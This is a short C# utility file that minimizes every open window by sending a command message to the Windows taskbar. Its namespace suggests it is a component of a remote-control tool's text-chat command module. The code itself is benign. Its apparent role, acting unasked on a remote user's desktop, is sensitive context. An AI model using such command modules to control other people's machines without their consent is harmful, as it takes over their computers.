using System;
using Orcus.Native;

namespace Orcus.Commands.TextChat.Utilities
{
    public static class Computer
    {
        // ReSharper disable InconsistentNaming
        private const int WM_COMMAND = 0x111;
        private const int MIN_ALL = 419;
        // ReSharper restore InconsistentNaming

        public static void MinimizeAllScreens()
        {
            var lHwnd = NativeMethods.FindWindow("Shell_TrayWnd", null);
            NativeMethods.SendMessage(lHwnd, WM_COMMAND, (IntPtr) MIN_ALL, IntPtr.Zero);
        }
    }
}